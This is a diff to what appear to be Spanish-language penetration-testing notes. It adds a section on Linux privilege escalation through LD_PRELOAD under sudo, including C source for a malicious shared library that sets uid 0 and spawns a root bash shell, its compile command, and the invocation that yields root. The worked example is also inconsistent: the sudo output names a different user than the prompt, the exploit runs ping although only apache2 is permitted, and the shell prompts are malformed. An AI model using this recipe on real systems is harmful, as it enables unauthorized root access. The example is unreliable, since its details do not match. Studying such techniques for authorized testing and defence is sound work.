@@ -2950,8 +2950,92 @@ En caso de que la máquina víctima no tenga acceso a internet, podemos hacer lo
 - `docker image ls`: Comprobamos que se cargo correctamente la imagen.
 - `docker run -v /:/mnt -it alpine`: Creamos el contenedor.
 
-##### Python Library Hijacking
 ##### LD_PRELOAD Shared Library
+
+Para realizar este ataque, se requiere:
+
+- Un usuario con privilegios sudo que pueda ejecutar al menos un comando (no importa cuál).
+- El uso de la variable de entorno `LD_PRELOAD` para lograr persistencia al invocar sudo.
+
+###### Sobre las bibliotecas compartidas
+
+Son archivos de código precompilado que múltiples programas pueden utilizar simultáneamente. Su propósito principal es:
+
+- Modularizar el código, evitando duplicaciones.
+- Permitir que distintas aplicaciones compartan funciones y recursos de manera eficiente.
+
+###### ¿Qué es LD_PRELOAD?
+
+Es una variable de entorno en sistemas Unix/Linux que fuerza la carga de una biblioteca compartida específica antes que las demás al ejecutar un programa. Esto permite:
+
+- Sobrescribir funciones de bibliotecas estándar (útil para debugging o, en este caso, para explotación).
+
+- Modificar el comportamiento de programas sin recompilarlos.
+
+###### Ejemplo
+
+```bash
+elliot@debian:~$ sudo -l
+
+Matching Defaults entries for daniel.carter on debian:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, env_keep+=LD_PRELOAD
+
+User daniel.carter may run the following commands on debian:
+    (root) NOPASSWD: /usr/sbin/apache2 restart
+```
+
+En el ejemplo anterior, observamos que:
+
+- El usuario elliot tiene permisos para ejecutar el comando apache2 como root sin necesidad de ingresar la contraseña.
+
+- La configuración de sudo incluye `env_keep+=LD_PRELOAD`, lo que significa que las variables de entorno (incluyendo `LD_PRELOAD`) se conservan al ejecutar comandos con sudo.
+
+###### Pasos para el Ataque
+
+1. **Creación de una Biblioteca Compartida Maliciosa**:
+
+    - Desarrollaremos una biblioteca compartida diseñada para sobrescribir funciones clave (ej: libc).
+
+2. **Inyección mediante `LD_PRELOAD`**:
+
+    - Usaremos la variable LD_PRELOAD para cargar nuestra biblioteca maliciosa antes que las bibliotecas del sistema.
+
+3. **Ejecución del Comando Privilegiado**:
+
+    - Al correr sudo `/usr/sbin/apache2 restart`, el sistema cargará nuestra biblioteca maliciosa debido a `LD_PRELOAD`, permitiéndonos ejecutar código arbitrario con privilegios de root.
+
+###### Creación de bibliotecas compartidas maliciosas 
+
+```c
+#include <stdio.h>
+#include <sys/types.h>
+#include <stdlib.h>
+#include <unistd.h>
+
+void _init() {
+    unsetenv("LD_PRELOAD");
+    setgid(0);
+    setuid(0);
+    system("/bin/bash");
+}
+```
+
+Compilamos el código:
+
+```bash
+gcc -fPIC -shared -o privesc.so privesc.c -nostartfiles
+```
+
+Ejecutamos el código:
+
+```bash
+elliot@debian:~$ $: sudo LD_PRELOAD=/locatio_of_malicious_library/malicious.so /usr/bin/ping
+root@@debian #: whoami
+root
+```
+
+##### Python Library Hijacking
+
 ##### Shared Object
 
 ##  11. <a name='active-directory'></a>Active Directory
